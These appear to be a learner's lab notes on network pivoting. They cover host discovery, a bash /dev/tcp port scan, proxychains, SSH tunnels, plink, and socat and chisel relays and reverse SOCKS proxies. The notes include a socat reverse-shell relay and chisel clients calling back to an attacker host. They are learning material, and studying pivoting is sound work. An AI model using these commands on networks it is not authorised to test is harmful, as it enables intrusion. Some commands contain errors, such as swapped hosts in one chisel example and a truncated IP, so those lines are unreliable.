# What is Pivoting
Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing, and is one of the three main teaching points for this room.



## The two types of pivoting
1. **Tunneling/Proxying** :  Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be tunnelled inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewall
	*Proxying is better if you are going to redirect lots of traffic like nmap scan etc.*
2. **Port Forwarding**: Creating a connection between a local port and a single port on a target, via a compromised host
	*Tends to be faster and more reliable but only allows access on single port*


## How to enumurate a network:

1. Using material found on the machine. The hosts file or ARP cache, for example
2. Using pre-installed tools
3. Using statically compiled tools
4. Using scripting techniques
5. Using local tools through a proxy

## Looking for other hosts on network
```
arp -a (to check arp cache win or linux)
/etc/hosts or /etc/resolv.conf or nmcli dev show( on linux )
c:\windows\System32\drivers\etc\hosts or ipconfig \all (on windows)

```
If didn't find any tools we can work with we can try to download a static copies of many tools like nmap 
and last resort is to turn scan through a proxy because it's often limited and very slow

```
basic bash ping sweep

for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

port scan with bash

for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done


```
ping sweeps for windows 
https://github.com/MuirlandOracle/C-Sharp-Port-Scan
https://github.com/MuirlandOracle/CPP-Port-Scanner

# Proxychains

 *Proxychains can often slow down a connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only when required.*
```
proxychains COMMAND IP

```

proxy chains takes it's options from config file and the master config file is located in /etc/proxychains.conf 
however proxychains looks in these locations by order 
1. current directory ./proxychains.conf
2. ~/.proxychains/proxychains.conf 
3. /etc/proxychains.conf

we can add more than 1 proxy here in the file 
![[Pasted image 20220822230004.png]]
If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the proxy_dns line using a hashtag (#) at the start of the line before performing a scan through the proxy!
Also worth noting that
- You can only use TCP scans  so use the  -Pn  switch to prevent Nmap from trying it
- It will be extremely slow. Try to only use Nmap through a proxy when using the NSE

# FoxyProxy
*Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available, namely: FoxyProxy!* 


# SSH tunneling


1. Port forwarding is accomplished with the -L

 *using this command will allow us to create a link to a local port*
e.g.
If we have a webserver we want to connect to on 172.16.0.10 and we have ssh access on 172.16.0.5 we can use the following command to gain access on webserver on .10 through .5 with ssh tunneling 

```
ssh -L 8000:172.16.0.10:80 (our port that we want the webserver to be at  - the webserver ip - the webserver port) user@172.16.0.5 -fN (SSH connection with the user we got )
```
We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 on our own attacking machine by going to localhost:8000


3. Proxies are made using the -D switch, for example: -D 1337
   This will open port 1337 on our machine that we will send data through and we can combine it with proxychains 
  ```
   ssh -D 1337 user@172.16.0.5 -fN
```

# Reverse Connections

First we generate ssh key using ssh-keygen
then we add the pub key to ~/.ssh/authorized_keys
and add command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty before it to  disallow the ability to gain a shell on your attacking machine
```
ssh-keygen
./key
nano ~/.ssh/authorized_keys
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
PUBLIC KEY HERE
save
sudo systemctl status ssh
sudo systemctl start ssh
```
then we send our priv key to the target and connect back to use that we should destroy the key after we are done
we can do port forwarding using 

```
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN

or we can use the newer ssh version to reverse proxy using
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN

```

to kill the connection after we are done we can use 
```
ps aux | grep ssh
sudo kill PID
```

## Plink.exe
*Plink.exe is a version of Putty SSH client because SSH isn't on windows by default like linux we can use Pllink.exe to get our tunnel with it*

after transferring the Plink.exe binary to the target we can run our reverse connection using
```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N

e.g.
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
```
any keys generated with ssh-keygen won't work here so we need to convert them with **puttygen** tool after downloading the tool we can use it to generate the key
```
puttygen KEYFILE -o OUTPUT_KEY.ppk
```
the output file can be transferred  to the target and work exact same way as in linux  

## socat
*So cat can be used for port forwarding,reversing tunneling and more and it can create encrypted connections and can relay connections from target to attacker*

first we need to download socat on the target box 
### Reverse shell Relay

first we create listener on our machine 
```
nc -lvnp 443
```
then we run socat to reverse connection 
```
./socat tcp-l:8000 tcp:ATTACKER_IP:443 &
```
### Port forwarding 

to do Port forwarding using socat 
e.g.
 if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:
 ```
 ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```
**fork** is used to put every connection into a new process
**reuseaddr** to make ports stays open after a connection is made

### Port forwarding --Quiet
to run port forwarding quietly we need to run 

On our attacker machine:
```

socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

Next, on compromised server

```
./ tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```
this makes connection between our listening port 8001 on the attacking machine and the open port of the target machine

e.g.

```
./socat tcp:10.50.73.2:8001 tcp:10.10.10.:80,fork &
```

to stop connections run 
```
jobs 
kill %NUMBER
```

## Chisel
*Setting Tunnel Proxy or port forwarding and has static binaries for linux and windows and doesn't require ssh *

chisel has 2 modes: client and server 
### Reverse SOCKS Proxy

On attacker box we use command
```
./chisel server -p LISTEN_PORT --reverse &
```
On compromised host
```
./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

### Forward SOCKS Proxy
*Not really reliable because it will get caught by firewall pretty fast *

on compromised host 
```
./chisel server -p LISTEN_PORT --socks5
```
on attacker box
```
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks 
```
PROXY_PORT is the port that will be opened for the proxy

### Proxy Chains Reminder
When sending data through either of these proxies we could start set the port in our proxychains.conf as chisel uses a SOCKS5 proxy we will need to change the start of the line from socks4 to socks5

### Remote Port Forward
For a remote port forward
```
./chisel server -p LISTEN_PORT --reverse &
```

the command to connect back on the target
```
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```
LISTEN_PORT is the port we started our listener on with chisel
LOCAL_PORT is the porn that will be opened on our attacking machine
e.g.
let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. 
On Attacker machine
```
./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
```
On the target
```
./chisel server -p 1337 --reverse &
```

### Local Port Forward
*connect from our own attacking machine to a chisel server listening on a compromised target*

On target
```
./chisel server -p LISTEN_PORT
```
on attacker
```
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```

e.g.
o connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:
```
./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
```